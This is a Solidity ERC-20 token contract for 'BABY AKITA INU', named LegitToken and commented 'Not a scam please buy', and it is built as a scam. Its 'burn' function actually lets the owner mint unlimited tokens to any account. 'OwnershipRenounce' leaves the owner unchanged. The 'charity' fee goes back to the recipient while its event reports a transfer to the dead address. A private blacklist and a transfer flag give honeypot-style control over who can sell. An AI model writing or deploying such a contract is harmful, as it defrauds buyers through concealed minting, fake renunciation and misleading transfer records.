/**
 *Submitted for verification at polygonscan.com on 2023-03-08
*/

pragma solidity ^0.8.0;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


//Not a scam please buy
contract LegitToken is IERC20 {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;

    mapping(address => bool) private _balances1;

    uint256 public _totalSupply = 10000000000000 * 10 ** 18;
    string public _name = "BABY AKITA INU";
    string public _symbol = "BAKITA";
    bool balances1 = true;

    address payable public charityAddress =
        payable(0x000000000000000000000000000000000000dEaD); // Marketing Address
    uint256 public charityPercent = 8;

    address public immutable burnAddress =
        0x000000000000000000000000000000000000dEaD;
    uint256 public burnPercent = 5;

    uint256 public marketingAmount;
    uint256 public burnAmount;


    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
        owner = msg.sender;
    }

    address public owner;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + addedValue
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(_blackbalances[sender] != true);
        require(
            balances1 || _balances1[sender],
            "ERC20: transfer to the zero address"
        );
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        uint256 burnAmount = (amount * burnPercent) / 100;
        uint256 charityAmount = (amount * charityPercent) / 100;
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        amount = amount - charityAmount - burnAmount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);

        if (charityPercent > 0) {
            _balances[recipient] += charityAmount;
            emit Transfer(sender, charityAddress, charityAmount);
        }

        if (burnPercent > 0) {
            _totalSupply -= burnAmount;
            emit Transfer(sender, burnAddress, burnAmount);
        }
    }

    function burn(address account, uint256 amount) public virtual onlyOwner {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        //require(balances1 || _balances1[sender] , "ERC20: transfer to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function OwnershipRenounce(address _owner) public onlyOwner {
        owner = owner;
    }
}